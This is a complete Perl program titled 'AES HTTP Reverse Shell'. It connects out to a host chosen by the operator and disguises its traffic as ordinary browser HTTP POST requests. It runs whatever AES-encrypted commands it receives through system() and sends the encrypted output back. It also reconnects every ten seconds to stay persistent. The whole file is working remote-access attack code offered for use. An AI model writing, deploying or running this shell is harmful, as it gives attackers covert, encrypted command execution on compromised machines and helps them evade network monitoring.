#!/usr/bin/perl

# AES HTTP Reverse Shell, shell.pl
# 
# (C) 2013 eor <eor[at]riseup.net>
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 1, or (at your option)
# any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.


use Getopt::Long;
use IO::Socket;
use Capture::Tiny ':all';
use Crypt::CBC;
use Digest::MD5 qw(md5_hex);
use MIME::Base64;

use strict;
use warnings;



sub make_post
{
    my $host = shift;
    my $data = shift;

    my $content_length = length($data);

    my $packet = "POST / HTTP/1.1\r\n" .
                "Host: $host\r\n" .
                "User-Agent: Mozilla/5.0 (X11; Linux i686; rv:22.0) Gecko/20100101 Firefox/22.0\r\n" .
                "Accept: text/html,appication/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n" .
                "Accept-Encoding: gzip, deflate\r\n" .
                "Connection: keep-alive\r\n" .
                "Content-Length: $content_length\r\n\r\n" .
                $data;

    return $packet;
}



sub attempt_connect
{
    my $host = shift;
    my $port = shift;

    my $sock = new IO::Socket::INET (PeerAddr => $host,
                                    PeerPort => $port,
                                    Proto => 'tcp')
                                    or return 0;


    return $sock;
}



sub interact
{
    my $sock = shift;
    my $host = shift;
    my $cipher = shift;

    $sock->recv(my $received, 1024);


    if (length($received) == 0) {
        $sock->close();
        return 0;
    }

    # seperate data from headers
    my @recv_arr = split /\r\n\r\n/, $received;

    my $data = $recv_arr[1];

    # decode and decrypt data
    my $decoded = decode_base64($data);
    my $decrypted = $cipher->decrypt($decoded);

    if ($decrypted eq "exit") {
        $sock->close();
        exit;
    } else {

        my $output = capture_merged {
            system($decrypted); 
        };

        # encrypt, encode, and create http packet
        my $encrypted = $cipher->encrypt($output);
        my $encoded = encode_base64($encrypted);

        my $packet = make_post($host, $encoded);


        $sock->send($packet);

        return 1;
    }
    
}



sub do_work
{
    my ($host, $key);
    my $port = 8080;

    
    GetOptions("host=s" => \$host,
                "port=i" => \$port,
                "key=s" => \$key);

    if (!defined($host) || !defined($key)) {
        print "! you are missing required arguments\n";
        exit;
    }

    # turn supplied key into md5 128 bit AES key
    $key = md5_hex($key);
    my $cipher = Crypt::CBC->new(-key => $key,
                                 -cipher => "Crypt::OpenSSL::AES");

    # this logic allows the shell to maintain persistence
    # when the listener is up and down
    my ($is_up, $sock);
    while(1) {
        $is_up = 1;
        my $sock = attempt_connect($host, $port);
        
        if ($sock) {
            while($is_up) {
                $is_up = interact($sock, $host, $cipher);
            }
        }

        sleep(10);
    }
}

do_work();
